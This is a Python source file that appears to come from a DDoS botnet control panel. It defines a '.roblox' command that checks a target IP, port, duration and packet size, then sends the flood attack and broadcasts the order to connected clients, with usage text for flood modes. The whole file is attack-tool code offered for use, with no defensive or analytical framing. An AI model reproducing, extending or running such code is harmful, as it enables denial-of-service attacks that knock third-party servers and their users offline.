from colorama import Fore

def roblox(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data):
    if len(args) == 6:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    if validate_size(size):
                        send(client, ansi_clear, False)
                        attack_sent2(ip, port, secs, size, client)
                        broadcast(data)
                    else:
                        send(client, Fore.RED + 'Invalid packet size (0-999999999999 bytes)')
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .roblox [IP] [PORT] [TIME] [SIZE] [MODE]')
        send(client, 'MODE --> RE_SLOW # make bytes data before')
        send(client, '                   and after not re-bytes if not end send 2500 packet')
        send(client, '          RE_NOW # if send 6 packet and re-bytes for next send packet')